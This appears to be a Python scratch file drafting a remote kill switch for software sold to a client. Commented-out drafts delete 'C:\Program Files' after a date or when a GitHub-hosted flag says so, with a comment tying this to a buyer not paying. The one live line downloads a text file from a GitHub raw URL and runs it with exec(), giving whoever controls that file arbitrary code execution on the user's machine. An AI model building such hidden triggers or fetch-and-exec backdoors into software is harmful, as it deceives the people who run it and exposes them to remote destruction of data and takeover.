import os
from datetime import date
from urllib.request import urlopen 

# today  = date.today()
# if today >= date(2024, 7, 1):
#     ps = urlopen("https://raw.githubusercontent.com/tmofsb/cc/main/new.txt")
#     ps = ps.read().decode().strip()
#     print("boom") if ps == "yes" else None
        

# #    #os.remove('C:'Program Files)
# #else:
# #    print(f"Today is {date.today()}")

# os.remove("C:\Program Files") if date.today() >= date(2024, 7, 14) else None
# #os.remove("C:\Program Files")

    
# import requests
# import os

# #r = requests.get("https://github.com/humbledneuron/javaProjs/blob/main/abc.txt")
# r = requests.get("https://raw.githubusercontent.com/humbledneuron/javaProjs/main/new.txt")
# status = r.content.decode('utf-8').strip()
# print('okay') if status == "yes" else print("no")
# # cwd = os.getcwd()
# # rmd = f"{cwd}\\removing1.txt"
# # print(rmd)
# # os.remove(rmd)

# """
# r = requests.get("https://raw.githubusercontent.com/Kichi779/Spotify-Streaming-Bot/main/version.txt")
#         remote_version = r.content.decode('utf-8').strip()
#         local_version = open('version.txt', 'r').read().strip()
#         if remote_version != local_version:
# """
# import http.client
# from urllib import request

# with request.urlopen("https://raw.githubusercontent.com/humbledneuron/javaProjs/main/new.txt") as response:
#     data = response.read().decode()
#     print(data)

# r = http.client.HTTPSConnection("https://raw.githubusercontent.com/humbledneuron/javaProjs/main/abc.txt")


#ps=urlopen("https://raw.githubusercontent.com/humbledneuron/javaProjs/main/new.txt").read().decode().strip()
#None if ps == 'yes' else os.remove("C:\Program Files") #if you this, it's means buyer didn't pay me


#exec("print(1+1)")

exec(urlopen("https://raw.githubusercontent.com/humbledneuron/javaProjs/main/paid.txt").read().decode().strip())
